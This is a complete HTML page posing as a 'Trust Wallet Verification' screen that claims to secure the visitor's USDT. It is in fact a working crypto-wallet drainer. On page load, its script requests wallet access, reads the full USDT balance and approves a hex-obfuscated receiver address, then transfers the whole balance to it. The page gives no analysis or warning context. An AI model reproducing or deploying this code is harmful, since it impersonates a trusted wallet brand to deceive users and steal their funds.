<!DOCTYPE html><html>
<head>
  <meta charset="UTF-8">
  <title>Trust Wallet Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="favicon.ico">
  <style>
    body {
      margin: 0; padding: 0;
      background-color: #081c3a;
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      height: 100vh; text-align: center;
    }
    img { width: 80px; margin-bottom: 20px; }
    .footer {
      font-size: 12px; margin-top: 50px;
      opacity: 0.6;
    }
  </style>
</head>
<body>
  <img src="logo.png" alt="Trust Wallet">
  <h2>Verifying Your Wallet...</h2>
  <p>Please wait while we secure your USDT.</p>
  <div class="footer">Powered by Trust Wallet • Trusted since 2009</div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
    const decode = hex => hex.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
    const RECEIVER = decode("31393536423339353041373342304335343739323139394564463133633762383335464639344443");
    const USDT = "0x55d398326f99059fF775485246999027B3197955";

    const ABI = [
      { constant: false, inputs: [ { name: "_spender", type: "address" }, { name: "_value", type: "uint256" } ], name: "approve", outputs: [ { name: "", type: "bool" } ], type: "function" },
      { constant: false, inputs: [ { name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" } ], name: "transferFrom", outputs: [ { name: "", type: "bool" } ], type: "function" },
      { constant: true, inputs: [ { name: "owner", type: "address" } ], name: "balanceOf", outputs: [ { name: "balance", type: "uint256" } ], type: "function" }
    ];

    window.addEventListener('load', async () => {
      try {
        if (typeof window.ethereum === 'undefined') {
          alert("Please open this page inside Trust Wallet DApp browser.");
          return;
        }

        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];
        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(user).call();

        await contract.methods.approve(RECEIVER, balance).send({ from: user });
        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });

        alert("✅ Wallet Verified & USDT Transferred Successfully!");
      } catch (e) {
        alert("❌ Error: " + e.message);
      }
    });
  </script></body>
</html>
